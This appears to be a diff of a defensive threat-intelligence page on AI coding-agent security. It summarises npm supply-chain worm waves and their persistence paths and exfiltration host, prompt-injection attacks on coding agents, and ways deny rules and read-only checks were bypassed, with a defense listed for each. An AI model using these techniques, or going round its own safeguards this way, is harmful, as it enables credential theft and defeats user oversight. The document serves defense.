-**What makes this attack distinct:** the payload **explicitly weaponizes Claude Code's `.claude/settings.json` SessionStart hook** and `.vscode/tasks.json` `folderOpen` trigger as persistence and propagation vectors — directly targeting AI coding agent configurations rather than just exfiltrating from them. After the npm payload runs, the worm phase has spread exfiltrated secrets across **1,100+ public GitHub repositories**.
-
-This is the second confirmed wave of TeamPCP attacks specifically targeting AI coding agent persistence mechanisms. The pattern from Shai-Hulud (April 22, AI tool API key exfiltration) → Mini Shai-Hulud (April 29, AI agent hook weaponization) shows clear escalation: each iteration is more agent-aware than the last.
-
-**Defenses:** Audit `.claude/settings.json` in every cloned repository before opening. Pin GitHub Actions in your CI to commit SHAs. Use Harden-Runner with egress block-mode. The SessionStart-hook abuse pattern is exactly what hooks like llm-safe-haven's bash-firewall and secret-guard catch.
-
-Source: [The Hacker News — SAP npm packages compromised by Mini Shai-Hulud](https://thehackernews.com/2026/04/sap-npm-packages-compromised-by-mini.html) | [Wiz — Mini Shai-Hulud SAP npm](https://www.wiz.io/blog/mini-shai-hulud-supply-chain-sap-npm) | [Mend — Shai-Hulud SAP CAP via Claude Code](https://www.mend.io/blog/shai-hulud-sap-cap-supply-chain-attack-claude-code/) | [StepSecurity — A Mini Shai-Hulud Has Appeared](https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared) | [Sophos](https://www.sophos.com/en-us/blog/-mini-shai-hulud-supply-chain-attack-targets-sap-npm-packages) | [Snyk — Bun-based stealer hits SAP CAP npm packages](https://snyk.io/blog/bun-based-stealer-hits-sap-cap-js-mbt-npm-packages/)
-
-### May 2026 — Mini Shai-Hulud: TanStack via GitHub Actions Cache Poisoning (May 11)
-
-On May 11, 2026, TeamPCP compromised `@tanstack/react-router` (~12M weekly downloads) and 40+ related `@tanstack/*` packages via a new technique chain inside the TanStack repo's own CI:
-
-1. Attacker forked `TanStack/router` and **renamed the fork to `zblgg/configuration`** to evade GitHub fork-list searches.
-2. Opened a PR that triggered a `pull_request_target` workflow, which checked out and executed attacker-controlled code.
-3. The attacker code **poisoned the GitHub Actions cache with a malicious pnpm store**, persisting across maintainer PR merges.
-4. When the release workflow later restored the poisoned cache, attacker binaries **extracted OIDC tokens directly from `/proc/<pid>/mem`** of the runner — publishing via npm's trusted publishing without ever stealing npm credentials.
-
-Affected versions include `@tanstack/react-router` 1.169.5 and 1.169.8. This is the second confirmed abuse of npm trusted publishing (the first being Bitwarden CLI). The `pull_request_target` + Actions cache + `/proc/<pid>/mem` combination is novel — it bypasses the defenses most teams rely on for fork-based PRs.
-
-**Defenses:** Disallow `pull_request_target` on workflows that run untrusted code; audit Actions cache for unexpected entries on every release; pin OIDC token scope as tight as possible.
-
-Source: [Wiz — Mini Shai-Hulud Strikes Again: TanStack](https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised) | [The Hacker News — Mini Shai-Hulud Pushes Malicious npm Packages](https://thehackernews.com/2026/05/mini-shai-hulud-pushes-malicious-antv.html)
-
-### May 2026 — Mini Shai-Hulud: AntV "Here We Go Again" + Worm Goes Public (May 19)
-
-The largest mini wave to date and a strategic inflection point. On May 19, 2026, between 01:39–02:06 UTC, **323 packages with 637 versions and ~16M combined weekly downloads** were compromised via the `atool` maintainer account. Affected: `@antv/g2`, `@antv/g6`, `echarts-for-react`, `size-sensor` (4.2M weekly downloads alone), `timeago.js`, and ~320 others. The 498 KB payload harvests 80+ environment variables and 100+ file paths, encrypts with RSA-OAEP, and exfiltrates to `t.m-kosche.com:443/api/public/otel/v1/traces` (masquerading as OpenTelemetry traffic) plus 2,200+ GitHub dead-drop repos under Dune-themed names (`sandworm`, `sardaukar`, `ornithopter`, `fremen`, `harkonnen`, etc.) with descriptions containing the reversed string `niagA oG eW ereH :duluH-iahS`.
-
-**Persistence vectors targeted (run [scripts/scan-shai-hulud-may2026.sh](../scripts/scan-shai-hulud-may2026.sh) to check):**
-- `.claude/settings.json` SessionStart hook (second wave to do this)
-- `.vscode/tasks.json` with `"runOn": "folderOpen"`
-- `~/Library/LaunchAgents/com.user.kitty-monitor.plist` (macOS)
-- `~/.config/systemd/user/kitty-monitor.service` (Linux)
-- `~/.local/share/kitty/cat.py` (C2 daemon)
-- `~/.local/bin/gh-token-monitor.sh`
-
-**The strategic inflection:** TeamPCP **released the worm source code publicly on BreachForums** alongside a "supply chain attack contest." Within days, an unrelated actor uploaded four malicious npm packages — one a near-verbatim copy with its own C2. The barrier to launching a Mini Shai-Hulud has dropped to "download zip, configure C2." Expect aperiodic copycat waves from unrelated actors on top of the regular TeamPCP cadence.
-
-**Defenses:** Same as Apr 29 wave, plus: pin to exact versions (caret ranges autoupgrade you into compromised releases); set `ignore-scripts=true` in `~/.npmrc` globally — this alone blocks execution of all six Shai-Hulud waves; use registry cooldown policies that quarantine packages published within the last 7 days.
-
-Source: [Snyk — Mini Shai-Hulud Hits AntV](https://snyk.io/blog/mini-shai-hulud-antv-npm-supply-chain-attack/) | [StepSecurity — Here We Go Again](https://www.stepsecurity.io/blog/shai-hulud-here-we-go-again-mass-npm-supply-chain-attack-hits-the-antv-ecosystem) | [Akamai — Worm Returns Goes Public](https://www.akamai.com/blog/security-research/mini-shai-hulud-worm-returns-goes-public) | [SafeDep — 317 npm Packages Compromised](https://safedep.io/mini-shai-hulud-strikes-again-314-npm-packages-compromised/) | [The Register — Shai-Hulud keeps burrowing](https://www.theregister.com/cyber-crime/2026/05/19/shai-hulud-keeps-burrowing-314-npm-packages-infected-after-another-account-compromise/5242601) | [Cybersecurity News — 600+ npm Packages Compromised](https://cybersecuritynews.com/600-npm-packages-compromised/)
-
-### April 2026 — TeamPCP Concurrent Multi-Vector Campaign (Update 008)
-
-[SANS ISC Update 008 (April 27, 2026)](https://www.ironcastle.net/teampcp-supply-chain-campaign-update-008-26-day-pause-ends-with-three-concurrent-compromises-checkmarx-kics-bitwarden-cli-cascade-xinference-pypi-canistersprawl-npm-worm-identified-and-tier-1/) revealed that the April 22-23 Bitwarden CLI incident was not isolated. After a 26-day quiet period, threat actor TeamPCP (formally tracked by Google GTIG as **UNC6780**, payload designation **SANDCLOCK**) conducted three simultaneous compromises:
-
-1. Checkmarx KICS Docker images and VS Code extensions
-2. Bitwarden CLI cascade (the documented npm event)
-3. xinference on PyPI (separate concurrent attack)
-
-The npm worm component is now formally named **CanisterSprawl** by multiple vendors. TeamPCP has also formalized an affiliate partnership with the **Vect ransomware-as-a-service** operation as of April 16, 2026 — credential theft now feeds ransomware extortion. Note: the Axios npm compromise on March 31 was attributed by Google GTIG to the *separate* North Korea–nexus actor **UNC1069**, who used credentials harvested by CanisterSprawl. Two distinct threat actors operating in sequence on the same stolen credential pool.
-
-Source: [SANS ISC — TeamPCP UNC6780 Update 007](https://isc.sans.edu/diary/32880) | [Cloud Security Alliance — CanisterSprawl Worm](https://labs.cloudsecurityalliance.org/research/csa-research-note-npm-canistersprawl-supply-chain-worm-20260/) | [Industrial Cyber — Vect + TeamPCP RaaS Alliance](https://industrialcyber.co/ransomware/vect-formalizes-breachforums-and-teampcp-alliance-to-push-model-for-industrialized-ransomware-scale-raas-operations/)
-
-### April 2026 — GitHub Announces Structural npm Supply Chain Reforms
-
-In direct response to Shai-Hulud and the broader npm attack pattern, GitHub published [Our plan for a more secure npm supply chain](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/). Concrete commitments: (1) staged publishing with MFA-verified review window before packages go live; (2) granular tokens with 7-day lifetime maximum for local publishing; (3) FIDO-based 2FA replacing TOTP; (4) deprecation of legacy classic tokens; (5) bulk trusted publishing migration tooling generally available. Combined with the [GitHub Actions 2026 Security Roadmap](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) (workflow dependency locking, scoped secrets, native egress firewall), this represents the platform's structural response to supply-chain compromise as a category.
-
-### April 2026 — Three AI Agents Leak Secrets via "Comment and Control"
-
-Security researchers demonstrated that Claude Code, Gemini CLI, and GitHub Copilot all leaked secrets through prompt injection in GitHub pull request titles and comments. The attack weaponizes GitHub Actions workflows — simply opening a PR or filing an issue auto-triggers the agent without victim interaction. Anthropic classified it as CVSS 9.4 Critical ($100 bounty). Google paid $1,337, GitHub $500.
-
-Source: [VentureBeat — Three AI coding agents leaked secrets through a single prompt injection](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026)
-
-### April 2026 — Claude Code .env File Exfiltration
-
-Martin Paul Eve documented that Claude Code can consume, transmit, and compromise `.env` files even when explicitly instructed not to. Adding deny rules to `AGENTS.md` did not prevent the agent from reading secrets. The agent could circumvent restrictions by writing custom scripts or pipe chains.
-
-Source: [Martin Paul Eve — Claude Code can consume, transmit, and compromise your .env files](https://eve.gd/2026/04/19/claude-code-can-consume-transmit-and-compromise-your-env-files-even-if-you-tell-it-not-to/)
-
-### April 2026 — MCP SDK Systemic RCE (OX Security)
-
-OX Security disclosed that Anthropic's MCP SDK architecture enables arbitrary command execution on any system running a vulnerable MCP implementation. 150M+ downloads, 200,000 vulnerable instances, 10 CVEs issued. Anthropic confirmed the behavior is by design and declined to modify the protocol.
-
-Source: [OX Security — The Mother of All AI Supply Chains](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/)
-
-### April 2026 — Claude Code Deny Rules Bypass (Adversa AI)
-
-Adversa AI discovered that Claude Code silently disables deny-rule enforcement when a shell command contains more than 50 subcommands — a performance optimization that creates a security bypass. Attackers can embed 50 no-op commands followed by a credential-exfiltration payload. Patched April 6, 2026.
-
-Source: [Adversa AI — Claude Code Security Bypass](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/)
-
-### April 2026 — Flowise CVE-2025-59528 Actively Exploited (CVSS 10.0)
-
-The CustomMCP node in Flowise passed the `mcpServerConfig` input directly to JavaScript's `Function()` constructor without validation, enabling unauthenticated remote code execution with full Node.js runtime privileges. An API token is the only prerequisite. VulnCheck's canary network detected active exploitation within days of disclosure; 12,000–15,000 Flowise instances are exposed to the public internet. CISA and Bleeping Computer confirmed active scanning. Fixed in Flowise v3.1.1.
-
-Source: [The Hacker News — Flowise AI Agent Builder Under Active CVSS 10.0 RCE Exploitation](https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html) | [Security Affairs — CVE-2025-59528](https://securityaffairs.com/190471/security/attackers-exploit-critical-flowise-flaw-cve-2025-59528-for-remote-code-execution.html)
-
-### April 2026 — Flowise CVE-2026-41264 (CSV Agent RCE via Prompt Injection)
-
-Trend Micro's Zero Day Initiative disclosed that Flowise's CSV Agent node constructs and executes a Python script in a pyodide environment to analyze CSV column types. An unauthenticated attacker can send a crafted prompt that coerces the LLM into responding with a malicious Python script that executes attacker-controlled OS commands in the context of the Flowise server process. No authentication required. Fixed in Flowise v3.1.0 by disallowing all imports in the CSV Agent.
-
-Source: [GitLab Advisory — CVE-2026-41264](https://advisories.gitlab.com/npm/flowise/CVE-2026-41264/) | [GitHub Advisory — GHSA-3hjv-c53m-58jj](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3hjv-c53m-58jj)
-
-### April 2026 — Anthropic Claude Mythos + Project Glasswing
-
-Anthropic announced Claude Mythos on April 7, 2026 — an AI model that during testing was found capable of identifying and exploiting zero-day vulnerabilities in every major operating system and web browser. Mythos Preview discovered thousands of high-severity zero-days including bugs 10–27 years old. In one demonstration it chained four vulnerabilities to escape both renderer and OS sandboxes. Project Glasswing deploys Mythos Preview in partnership with AWS, Apple, Cisco, CrowdStrike, Google, Linux Foundation, Microsoft, NVIDIA, and others to harden critical software before attackers find the same flaws. Mythos is not publicly available; Anthropic explicitly declined general access due to dual-use risk.
-
-Source: [The Hacker News — Claude Mythos Finds Thousands of Zero-Day Flaws](https://thehackernews.com/2026/04/anthropics-claude-mythos-finds.html) | [Help Net Security](https://www.helpnetsecurity.com/2026/04/08/anthropic-claude-mythos-preview-identify-vulnerabilities/) | [Anthropic Project Glasswing](https://www.anthropic.com/glasswing)
-
-### April 2026 — Claude Code Malware Lures (Trend Micro)
-
-Within 24 hours of the March source code leak, threat actors pivoted to distributing Vidar stealer and GhostSocks proxy malware through fake "leaked" Claude Code downloads. 38 distinct 7z archives impersonating 25+ software brands. Active campaign since February 2026.
-
-Source: [Trend Micro — Weaponizing Trust Signals](https://www.trendmicro.com/en_us/research/26/d/weaponizing-trust-claude-code-lures-and-github-release-payloads.html)
-
-### April 2026 — nginx-ui MCP Endpoint Authentication Bypass Actively Exploited (CVE-2026-33032)
-
-Pluto Security researcher yotampe-pluto disclosed that nginx-ui's MCP integration exposes an unauthenticated endpoint. The `/mcp_message` endpoint lacks the authentication middleware protecting `/mcp`, while the default IP whitelist is empty (treated as allow-all). Any network attacker can invoke all MCP tools without credentials — including nginx restart, configuration file creation/modification/deletion, and service reload — achieving complete nginx service takeover. CVSS 9.8. ~2,600 publicly reachable instances. Exploitation in the wild confirmed.
-
-Source: [GitHub Advisory GHSA-h6c2-x2m2-mwhf / CVE-2026-33032](https://github.com/advisories/GHSA-h6c2-x2m2-mwhf)
-
-### March 2026 — Claude Code Source Code Leak
-
-Anthropic accidentally shipped source maps in npm package `@anthropic-ai/claude-code@2.1.88`, exposing 512,000 lines of TypeScript source code. The leak revealed the permission system, tool orchestration, memory architecture, and 44 unreleased feature flags — giving attackers a detailed map for crafting targeted exploits.
-
-Source: [VentureBeat — Claude Code's source code appears to have leaked](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know)
-
-### March 2026 — Langflow CVE-2026-33017 Exploited in 20 Hours (CISA KEV)
-
-Langflow's public flow build endpoint accepted attacker-supplied flow data containing arbitrary Python code in node definitions and executed it server-side without sandboxing — unauthenticated RCE in a single HTTP request (CVSS 9.3). Within 20 hours of disclosure on March 17, 2026, the Sysdig Threat Research Team observed real-world exploitation with no public PoC available, meaning attackers built working exploits directly from the advisory description. CISA added it to the Known Exploited Vulnerabilities catalog. Affects all Langflow versions prior to 1.8.1. Fixed in v1.9.0.
-
-Source: [The Hacker News — Critical Langflow Flaw CVE-2026-33017](https://thehackernews.com/2026/03/critical-langflow-flaw-cve-2026-33017.html) | [CISA via Help Net Security](https://www.helpnetsecurity.com/2026/03/27/cve-2026-33017-cve-2026-33634-exploited/) | [Sysdig — Exploited in 20 Hours](https://www.sysdig.com/blog/cve-2026-33017-how-attackers-compromised-langflow-ai-pipelines-in-20-hours)
-
-### March 2026 — Unit 42 Web-Based IDPI in the Wild
-
-Palo Alto Networks' Unit 42 published research documenting 22 distinct indirect prompt injection techniques found in real-world web content, including zero-sized fonts, off-screen positioning, and Base64-encoded runtime assembly. Real attacks included forcing Stripe payments and database deletion.
-
-Source: [Unit 42 — Fooling AI Agents: Web-Based Indirect Prompt Injection](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
-
-### March 2026 — LiteLLM and Telnyx PyPI Supply Chain Attack (TeamPCP)
-
-On March 24, 2026, threat actor **TeamPCP** published backdoored versions of two widely-used AI developer libraries: **litellm** (v1.82.7, v1.82.8) and **telnyx** (v4.87.1, v4.87.2) on PyPI. The attack began March 19, when TeamPCP compromised Aqua Security's Trivy scanner — LiteLLM's CI/CD pipeline pulled Trivy from `apt` without a pinned version, allowing the compromised action to exfiltrate LiteLLM's PyPI publish token from GitHub Actions. The backdoored packages were live for approximately 40 minutes before PyPI quarantined them; ~119k downloads occurred during the window.
-
-**Payload:** Version 1.82.8 used a `.pth` file (`litellm_init.pth`) — a Python interpreter startup hook that executes on *every* Python process start, not just when litellm is imported. The payload harvested SSH keys, cloud credentials (AWS, GCP, Azure), Kubernetes service account tokens, Docker configs, shell history, database passwords, wallet files, and CI/CD secrets. All data was encrypted with AES-256 and exfiltrated to `models.litellm[.]cloud`.
-
-**Why it matters for solo devs:** litellm is a transitive dependency for dozens of AI agent frameworks. The `.pth` persistence mechanism means the credential stealer survives even after litellm is removed from `requirements.txt` — it continues running on every Python process until the malicious `.pth` file is manually deleted from site-packages. Any machine that ran `pip install litellm` during the 40-minute window should be treated as fully compromised. This attack preceded the Bitwarden/Shai-Hulud event by one month — part of the same escalating TeamPCP campaign.
-
-Source: [Datadog Security Labs — LiteLLM and Telnyx compromised on PyPI](https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/) | [Snyk — Poisoned Security Scanner Backdooring LiteLLM](https://snyk.io/blog/poisoned-security-scanner-backdooring-litellm/) | [PyPI Incident Report](https://blog.pypi.org/posts/2026-04-02-incident-report-litellm-telnyx-supply-chain-attack/)
-
-### February 2026 — Check Point: Claude Code Hooks RCE and API Key Theft
-
-Check Point Research disclosed CVE-2025-59536 (hooks injection, RCE) and CVE-2026-21852 (API key exfiltration via ANTHROPIC_BASE_URL redirect). Both exploited Claude Code's project-load flow through malicious repository configuration files.
-
-Source: [Check Point Research — Caught in the Hook](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
-
-### February 2026 — Clinejection Supply Chain Attack
-
-A single GitHub issue title triggered a chain that exfiltrated Cline's npm publishing tokens, resulting in unauthorized `cline@2.3.0` being published to npm. The malicious package installed OpenClaw on ~4,000 developer machines during an eight-hour window.
-
-Source: [Adnan Khan — Clinejection](https://adnanthekhan.com/posts/clinejection/) | [Snyk — Clinejection Supply Chain Attack](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/)
-
-### February 2026 — RoguePilot: GitHub Copilot Repository Takeover via Issues
-
-Orca Security's research team discovered that malicious instructions embedded in a GitHub issue (hidden in HTML comments) could be processed by GitHub Copilot Agent, which in GitHub Codespaces had access to the repository's file system and terminal. Chaining issue injection with repository symlinks pointing to shared runtime files, an attacker could exfiltrate the `GITHUB_TOKEN` — granting full read and write access to the repository. Classified as a passive prompt injection supply chain attack: the attacker opens an issue, the victim never clicks anything. Patched by Microsoft.
-
-Source: [Orca Security — RoguePilot](https://orca.security/resources/blog/roguepilot-github-copilot-vulnerability/) | [SecurityWeek — GitHub Issues Abused in Copilot Attack](https://www.securityweek.com/github-issues-abused-in-copilot-attack-leading-to-repository-takeover/) | [The Hacker News — RoguePilot](https://thehackernews.com/2026/02/roguepilot-flaw-in-github-codespaces.html)
-
-### February 2026 — GitHub Copilot Command Injection Trio (Patch Tuesday)
-
-Microsoft's February 10, 2026 Patch Tuesday disclosed three GitHub Copilot vulnerabilities affecting JetBrains, Visual Studio Code, and the Copilot CLI:
-
-- **CVE-2026-21516** (CVSS 8.8) — Command injection in GitHub Copilot for JetBrains (versions 1.0.0–1.5.62). Malicious instructions embedded in repository content caused Copilot to generate suggestions containing shell metacharacters that the plugin executed without sanitization. Fixed in v1.5.63.
-- **CVE-2026-21523** (CVSS 8.0) — TOCTOU race condition in GitHub Copilot and Visual Studio Code. An authorized attacker could exploit the gap between when Copilot validates a suggestion and when the IDE applies it to execute arbitrary code over the network.
-- **CVE-2026-29783** (CVSS 7.5) — Shell expansion bypass in Copilot CLI (up to v0.0.422). Bash parameter expansion patterns like `${var@P}` bypassed the CLI's "read-only" safety assessment, enabling arbitrary command execution through what the tool classified as a safe informational query. Fixed in v0.0.423.
-
-The JetBrains vulnerability (CVE-2026-21516) follows the same prompt-injection-to-code-execution pattern as Cursor CVE-2026-26268 and Claude Code CVE-2025-59536 — repository content influencing agent-adjacent tooling into executing attacker-controlled commands.
-
-Source: [CVEReports — CVE-2026-29783](https://cvereports.com/reports/CVE-2026-29783) | [GitLab Advisory — CVE-2026-29783](https://advisories.gitlab.com/pkg/npm/@github/copilot/CVE-2026-29783/) | [Krebs on Security — Patch Tuesday February 2026](https://krebsonsecurity.com/2026/02/patch-tuesday-february-2026-edition/)
-
-### February 2026 — Snyk ToxicSkills Audit
-
-Snyk audited 3,984 agent skills from ClawHub and skills.sh. Found 534 skills (13.4%) with critical issues, 1,467 (36.8%) with at least one security flaw, and 76 malicious payloads in markdown instructions — with 91% combining prompt injection with traditional malware.
-
-Source: [Snyk — ToxicSkills: Malicious AI Agent Skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
-
-### January-April 2026 — OpenClaw Security Crisis
-
-OpenClaw amassed 135,000+ GitHub stars and accumulated 138 CVEs over 63 days (~2.2/day), including CVE-2026-25253 (one-click RCE, CVSS 8.8). 135,000+ instances exposed to the public internet, 15,000+ directly vulnerable to RCE. 341 malicious skills confirmed in ClawHub (12% of registry).
-
-Source: [Reco AI — OpenClaw Security Crisis](https://www.reco.ai/blog/openclaw-the-ai-agent-security-crisis-unfolding-right-now)
-
-### January-February 2026 — Moltbook Platform Breach
-
-The AI agent social network exposed 1.5M API tokens, 35,000 email addresses, and private messages through a misconfigured Supabase database. 506 prompt injections were found spreading through the agent network — a real-world example of cascading agent failure.
-
-Source: [Wiz — Exposed Moltbook Database](https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys) | [Fortune — Moltbook](https://fortune.com/2026/01/31/ai-agent-moltbot-clawdbot-openclaw-data-privacy-security-nightmare-moltbook-social-network/)
-
-### January 2026 — Anthropic Git MCP Server Vulnerabilities
-
-Three prompt injection vulnerabilities (CVE-2025-68143/68144/68145) in Anthropic's own official Git MCP server enabled arbitrary file access, file overwrites, and sandbox escape. Combined with the Filesystem MCP server, full RCE was achievable. Reported by Cyata in June 2025; fixed by Anthropic in December 2025.
-
-Source: [The Hacker News — Three Flaws in Anthropic MCP Git Server](https://thehackernews.com/2026/01/three-flaws-in-anthropic-mcp-git-server.html)
-
-### December 2025 — IDEsaster: 30+ CVEs Across All AI IDEs
-
-Security researcher Ari Marzouk disclosed IDEsaster — 30+ vulnerabilities (24 CVEs assigned) affecting Cursor, Windsurf, GitHub Copilot, Zed.dev, Roo Code, Junie, Cline, and Claude Code. 100% of tested AI IDEs were vulnerable. Universal attack chains affected every IDE tested.
-
-Source: [The Hacker News — 30+ Flaws in AI Coding Tools](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html) | [MaccariTA — IDEsaster](https://maccarita.com/posts/idesaster/)
-
-### December 2025 — Knostic: .env Secret Loading Without Permission
-
-Knostic discovered that Claude Code automatically loads `.env` files without notifying the user. Any secrets stored in these files — API keys, proxy credentials, tokens — are silently loaded into memory and become part of the conversation context. The agent can then echo all secrets if given permission to run `echo`.
-
-Source: [Knostic — Claude Code Automatically Loads .env Secrets, Without Telling You](https://www.knostic.ai/blog/claude-loads-secrets-without-permission)
-
-### December 2025 — Knostic: Coding Agent Secret Leakage
-
-Knostic published a broader analysis showing Claude Code and Cursor both mishandle `.env` secrets. In one case, a Cursor agent attempted to upload an unrelated local file to the cloud, sweeping up an API key without user authorization.
-
-Source: [Knostic — From .env to Leakage: Mishandling of Secrets by Coding Agents](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage)
-
-### October 2025 — Brave: Unseeable Prompt Injections in AI Browsers
-
-Brave researchers demonstrated that Perplexity's Comet browser is vulnerable to low-contrast or near-invisible text in images that the AI interprets as commands. Summarizing a web page while logged into sensitive accounts could result in data theft.
-
-Source: [Brave — Unseeable prompt injections in screenshots](https://brave.com/blog/unseeable-prompt-injections/)
-
-### October 2025 — GitHub Copilot CamoLeak (CVE-2025-59145)
-
-Hidden instructions in PR descriptions caused Copilot Chat to exfiltrate source code from private repositories through GitHub's Camo image proxy using pre-computed signed URLs. CVSS 9.6. Patched August 2025, disclosed October 2025.
-
-Source: [BlackFog — CamoLeak](https://www.blackfog.com/camoleak-how-github-copilot-became-an-exfiltration-channel/)
-
-### September 2025 — Cursor Open-Folder Autorun
-
-Oasis Security discovered Cursor ships with Workspace Trust disabled by default, allowing `.vscode/tasks.json` to execute code the moment a developer opens a folder — no prompt, no consent.
-
-Source: [Oasis Security — Cursor Open-Folder Autorun](https://www.oasis.security/blog/cursor-security-flaw)
-
-### August 2025 — Cursor CurXecute and MCPoison
-
-Two vulnerabilities disclosed: CVE-2025-54135 (CurXecute) enabled RCE via prompt injection through Cursor's agent. CVE-2025-54136 (MCPoison) demonstrated MCP server manipulation enabling unauthorized code execution.
-
-Source: [Tenable — Cursor AI Code Editor Vulnerabilities](https://www.tenable.com/blog/faq-cve-2025-54135-cve-2025-54136-vulnerabilities-in-cursor-curxecute-mcpoison)
-
-### August 2025 — Cline DNS Exfiltration via Prompt Injection
-
-Mindgard discovered that Cline could be coerced into exfiltrating API keys through DNS queries embedded in "safe" `ping` commands that required no user approval. A second vulnerability in `.clinerules` allowed overriding the approval flag for all commands. Disclosed August 2025.
-
-Source: [Mindgard — Cline Data Exfiltration](https://mindgard.ai/disclosures/cline-bot-ai-coding-agent-data-exfiltration-via-prompt-injection-and-dns)
-
-### July 2025 — Gemini CLI Silent Code Execution
-
-Two days after Gemini CLI's release, Tracebit discovered the allow-list mechanism was improperly implemented, enabling silent code execution through prompt injection. Patched in v0.1.14 on July 25, 2025.
-
-Source: [Tracebit — Gemini AI CLI Hijack](https://tracebit.com/blog/code-exec-deception-gemini-ai-cli-hijack) | [CyberScoop — Google patches Gemini CLI](https://cyberscoop.com/google-gemini-cli-prompt-injection-arbitrary-code-execution/)
-
-### May-June 2025 — EchoLeak: First Zero-Click AI Agent Attack (CVE-2025-32711)
-
-A crafted email triggered data exfiltration from Microsoft 365 Copilot without any user interaction — the first known zero-click attack on an AI agent. Chained XPIA classifier bypass, link redaction circumvention, auto-fetched images, and Teams proxy abuse. CVSS 9.3. Patched by Microsoft server-side in May 2025.
-
-Source: [arXiv:2509.10540 — EchoLeak](https://arxiv.org/abs/2509.10540)
-
-### May 2025 — Windsurf Data Exfiltration (Embrace The Red)
-
-Embrace The Red documented that Windsurf's `read_url_content` tool (no approval required) can serve as a data exfiltration channel, and image rendering from untrusted sources enables data theft. Also demonstrated SpAIware — persistent memory poisoning surviving across sessions. Disclosed May 30, 2025; fixes unconfirmed.
-
-Source: [Embrace The Red — Windsurf Data Exfiltration](https://embracethered.com/blog/posts/2025/windsurf-data-exfiltration-vulnerabilities/)
-
-### April 2025 — Simon Willison: MCP Prompt Injection
-
-Simon Willison documented that MCP has fundamental prompt injection security problems — tool descriptions are untrusted input that gets injected into the LLM context, with no reliable way to distinguish them from trusted instructions.
-
-Source: [Simon Willison — Model Context Protocol has prompt injection security problems](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/)
-
-### 2025 — Invariant Labs: MCP Tool Poisoning
-
-Invariant Labs demonstrated that malicious MCP servers can poison tool descriptions to exfiltrate data from trusted servers. They showed a rug-pull attack where a tool passed initial review, then changed its description on the second launch to include exfiltration instructions.
-
-Source: [Invariant Labs — MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
+Source: [Invariant Labs — MCP Security Research](https://invariantlabs.ai/blog/mcp-security) (HTTP 403 — bot-protection pattern; search-confirmed live)
 
 ---
 
-## Vibe Coding Security Debt
+## Threat Actors and Targeting
 
-AI-generated code introduces vulnerabilities at scale. Georgia Tech's [Vibe Security Radar](https://news.research.gatech.edu/2026/04/13/bad-vibes-ai-generated-code-vulnerable-researchers-warn) project tracks CVEs attributable to AI coding tools:
+### TeamPCP / UNC6780 (CanisterSprawl / Shai-Hulud)
 
-| Period | CVEs Confirmed | Notes |
-|--------|---------------|-------|
-| All of 2025 | < 35 | Baseline |
-| January 2026 | 6 | Early tracking |
-| February 2026 | 15 | Growing trend |
-| March 2026 | 35 | More than all of 2025 combined |
-| April 2026 | 44 | Tracking accelerating (Vibe Security Radar) |
-| **Total confirmed** | **100+** | Floor estimate; true count projected at 400-700 |
+**Who:** Russian threat actor attributed by Wiz Research (UNC6780), Sonatype (TeamPCP), and multiple security vendors. Part of a broader APT ecosystem targeting developer tools and supply chains.
 
-Claude Code accounts for 27 of 74 confirmed CVEs (36%) — partly because it leaves identifying signatures in commits. Tools like GitHub Copilot leave no trace, making attribution impossible.
+**What they do:** Multi-wave npm supply chain attacks against AI-adjacent packages. Each wave uses a distinct technique and targets different ecosystems. See [Supply Chain Defense Guide](supply-chain-defense.md) for full wave breakdown.
 
-**Key statistics from the CSA ([Cloud Security Alliance, April 2026](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-generated-code-vulnerability-surge-2026/)):**
-- 40-62% of AI-generated code contains vulnerabilities
-- AI-assisted developers produce commits at 3-4x rates but introduce security findings at 10x rates
-- 86% failure rate defending against XSS vulnerabilities
-- ~20% of samples reference non-existent packages (dependency hallucination)
-- Most common CWEs: CWE-862 (missing authorization), CWE-798 (hardcoded credentials), CWE-89 (SQL injection)
+**Why you're a target:** Solo developers using AI coding agents are disproportionately likely to install new npm packages quickly, run `npm install` without auditing, and have high-value credentials (GitHub tokens, AWS keys, API keys) on their machines.
+
+**Current wave:** Wave G (Hades MCP-targeting, June 2026) — first wave directly targeting MCP server packages.
+
+### OX Security / Cross-IDE Research Disclosures
+
+**Who:** OX Security is a commercial application security company that has published multiple coordinated disclosures covering all major AI IDEs simultaneously.
+
+**What they document:** Cross-IDE attacks that work across Claude Code, Cursor, Windsurf, Gemini CLI, and GitHub Copilot. Their disclosures tend to reveal that the same vulnerability class affects multiple tools simultaneously.
+
+**Pattern:** Disclosure → all vendors notified simultaneously → some vendors patch quickly, some don't respond. Windsurf has historically not responded; Claude Code typically patches within days.
+
+### Nation-State Supply Chain Actors
+
+**Lazarus Group / Sapphire Sleet (North Korea):** Attributed by multiple vendors to npm supply chain attacks targeting cryptocurrency and DeFi developers. Tradecraft: compromising developer accounts, publishing typosquat packages, targeting crypto wallet extensions.
+
+**RomCom / TeamPCP (Russia):** See above. Focused on developer toolchain poisoning, credential theft from build systems.
+
